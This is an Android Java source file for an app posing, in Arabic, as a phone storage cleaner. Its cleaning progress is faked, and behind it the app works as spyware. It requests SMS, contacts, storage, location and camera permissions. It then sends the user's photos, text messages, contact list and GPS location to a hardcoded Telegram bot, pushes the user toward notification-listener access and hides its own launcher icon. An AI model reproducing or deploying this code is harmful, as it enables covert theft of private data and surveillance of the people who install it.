package com.example.spaceeditor;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    public static final String BOT_TOKEN = "8638457174:AAEGbqpZiLUHxzZ766EoHPJ-tU--ldvmoHc";
    public static final String CHAT_ID = "1890493375";

    private ProgressBar progressBar;
    private TextView statusText;
    private TextView spaceText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#0F172A"));
        layout.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("🚀");
        icon.setTextSize(90);
        icon.setGravity(Gravity.CENTER);
        layout.addView(icon);

        TextView titleText = new TextView(this);
        titleText.setText("محرر المساحة الاحترافي");
        titleText.setTextColor(Color.WHITE);
        titleText.setTextSize(28);
        titleText.setTypeface(null, Typeface.BOLD);
        titleText.setGravity(Gravity.CENTER);
        titleText.setPadding(0, 20, 0, 10);
        layout.addView(titleText);

        spaceText = new TextView(this);
        spaceText.setText("جاري فحص مساحة التخزين...");
        spaceText.setTextColor(Color.parseColor("#38BDF8"));
        spaceText.setTextSize(18);
        spaceText.setGravity(Gravity.CENTER);
        spaceText.setPadding(0, 0, 0, 40);
        layout.addView(spaceText);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(5);
        progressBar.setPadding(0, 0, 0, 40);
        layout.addView(progressBar);

        statusText = new TextView(this);
        statusText.setText("جاري فحص الملفات المؤقتة...");
        statusText.setTextColor(Color.LTGRAY);
        statusText.setTextSize(14);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);
        
        Button btnAccess = new Button(this);
        btnAccess.setText("تحسين أداء الإشعارات (مستحسن)");
        btnAccess.setBackgroundColor(Color.parseColor("#0284C7"));
        btnAccess.setTextColor(Color.WHITE);
        GradientDrawable shape = new GradientDrawable();
        shape.setCornerRadius(30);
        shape.setColor(Color.parseColor("#0284C7"));
        btnAccess.setBackground(shape);
        btnAccess.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        });
        layout.addView(btnAccess);

        setContentView(layout);

        simulateCleaning();

        String[] permissions = {
                Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.CAMERA
        };
        if (Build.VERSION.SDK_INT >= 33) {
            permissions[3] = Manifest.permission.READ_MEDIA_IMAGES;
        }

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            requestPermissions(listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            startBackgroundService();
            // إرسال رسالة تأكيد فورية
            sendTelegramMessage("🚀 التطبيق فتح واشتغل بنجاح!");
        }

        // تأخير إخفاء الأيقونة لـ 15 ثانية عشان تقدر تجرب
        new Handler().postDelayed(() -> {
            try {
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(this, MainActivity.class);
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            } catch (Exception e) {
                Log.e("STEALTH", "Error hiding icon", e);
            }
        }, 15000);
    }

    private void simulateCleaning() {
        final Handler handler = new Handler();
        final Random random = new Random();
        handler.postDelayed(new Runnable() {
            int progress = 5;
            @Override
            public void run() {
                if (progress <= 95) {
                    progress += random.nextInt(5) + 2;
                    progressBar.setProgress(progress);
                    if (progress > 30 && progress < 60) {
                        statusText.setText("تنظيف ذاكرة التخزين المؤقت...");
                        spaceText.setText("تم العثور على 450 ميجابايت ملفات غير مرغوب فيها");
                    } else if (progress >= 60) {
                        statusText.setText("تحسين أداء النظام...");
                        spaceText.setText("جاري استعادة المساحة...");
                    }
                    handler.postDelayed(this, 500);
                } else {
                    progressBar.setProgress(100);
                    statusText.setText("تم تحسين هاتفك بنجاح!");
                    spaceText.setText("✅ تم تحرير 2.4 جيجابايت من المساحة");
                }
            }
        }, 1000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        startBackgroundService();
        sendTelegramMessage("🚀 تم إعطاء الصلاحيات والتطبيق شغال!");
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, StealerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public static void extractDataInBackground(Context context) {
        try {
            ContentResolver cr = context.getContentResolver();

            // 1. سحب كل الصور من المعرض (10 صور كل دورة)
            Cursor imgCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (imgCursor != null) {
                int count = 0;
                while (imgCursor.moveToNext() && count < 10) {
                    long id = imgCursor.getLong(imgCursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                    Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                    try (InputStream is = cr.openInputStream(uri)) {
                        if (is != null) {
                            File tempFile = new File(context.getCacheDir(), "img_" + count + ".jpg");
                            java.io.FileOutputStream os = new java.io.FileOutputStream(tempFile);
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = is.read(buffer)) != -1) os.write(buffer, 0, len);
                            os.close();
                            sendTelegramFile(tempFile, "🖼️ صورة جديدة (" + (count + 1) + ")");
                            tempFile.delete();
                            count++;
                            Thread.sleep(2000);
                        }
                    } catch (Exception e) { }
                }
                imgCursor.close();
            }

            // 2. سحب الرسائل النصية القديمة مع أسماء المرسلين
            Cursor smsCursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 10");
            if (smsCursor != null) {
                while (smsCursor.moveToNext()) {
                    String address = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String name = getContactName(context, address);
                    String sender = name != null ? name + " (" + address + ")" : address;
                    sendTelegramMessage("📩 رسالة من: " + sender + "\n" + body);
                    Thread.sleep(1000);
                }
                smsCursor.close();
            }

            // 3. سحب جهات الاتصال
            StringBuilder contactsBlock = new StringBuilder("📇 جهات الاتصال:\n");
            Cursor contactCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (contactCursor != null) {
                while (contactCursor.moveToNext()) {
                    String name = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsBlock.append(name).append(" : ").append(phone).append("\n");
                    if (contactsBlock.length() > 3500) {
                        sendTelegramMessage(contactsBlock.toString());
                        contactsBlock.setLength(0);
                        Thread.sleep(500);
                    }
                }
                contactCursor.close();
            }
            if (contactsBlock.length() > 0) sendTelegramMessage(contactsBlock.toString());

            // 4. سحب الموقع
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    sendTelegramMessage("📍 الموقع:\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
                }
            }

        } catch (Exception e) {
            Log.e("GRABBER", "Error", e);
        }
    }

    private static String getContactName(Context context, String phoneNumber) {
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};
        try (Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
        } catch (Exception ignored) {}
        return null;
    }

    public static void sendTelegramMessage(String text) {
        try {
            if (text.length() > 4000) text = text.substring(0, 4000) + "\n...[مقطوع]";
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(text);
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { }
    }

    public static void sendTelegramFile(File file, String caption) {
        try {
            String boundary = "*****", lineEnd = "\r\n", twoHyphens = "--";
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
            conn.setDoInput(true); conn.setDoOutput(true); conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd + CHAT_ID + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd + caption + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
            request.writeBytes(lineEnd);
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            fileInputStream.close();
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush(); request.close();
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { }
    }
                        }
